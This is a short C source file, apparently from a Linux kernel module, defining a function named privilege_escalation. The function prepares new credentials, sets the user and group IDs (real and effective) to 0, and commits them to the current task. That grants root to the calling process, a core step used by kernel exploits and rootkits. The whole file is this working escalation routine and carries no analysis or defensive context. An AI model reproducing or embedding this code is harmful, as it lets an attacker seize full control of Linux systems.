#include "priv_escalation.h"
#include <linux/cred.h>

int privilege_escalation(void) {

    struct cred *new_creds;
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    /*
     * Prepare credentials for current task
     */
    new_creds = prepare_creds();

    if (new_creds == NULL) {
        return -ENOMEM;
    }

    /*
     * Modify credentials
     */
    new_creds->uid = kuid;
    new_creds->gid = kgid;
    new_creds->euid = kuid;
    new_creds->egid = kgid;

    /*
     * Update credentials of current task
     */
    commit_creds(new_creds);

    return 0;
}